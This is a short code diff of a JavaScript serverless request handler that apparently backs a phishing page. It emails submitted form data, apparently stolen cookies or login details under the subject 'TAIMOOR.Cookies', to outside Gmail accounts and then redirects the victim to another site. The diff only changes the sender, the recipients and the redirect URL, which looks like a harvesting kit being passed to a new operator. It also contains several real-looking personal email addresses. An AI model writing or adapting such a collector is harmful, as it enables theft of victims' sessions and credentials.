@@ -40,9 +40,9 @@ export default async function handler(req, res) {
   try {
     // Try sending email
     await transporter.sendMail({
-      from: `"PROFESSOR" <hgfver414@gmail.com>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
-      subject: "TAIMOOR.Cookies",
+      from: `"PROFESSOR" <dadankhan096@gmail.com>`,
+      to: "adsmenigar@gmail.com",
+      subject: "DK",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
@@ -55,5 +55,5 @@ export default async function handler(req, res) {
   }
 
   // Always redirect (success or failure)
-  return res.redirect(302, "https://paas-nu.vercel.app/");
+  return res.redirect(302, "https://instant-send-review.vercel.app/");
 }
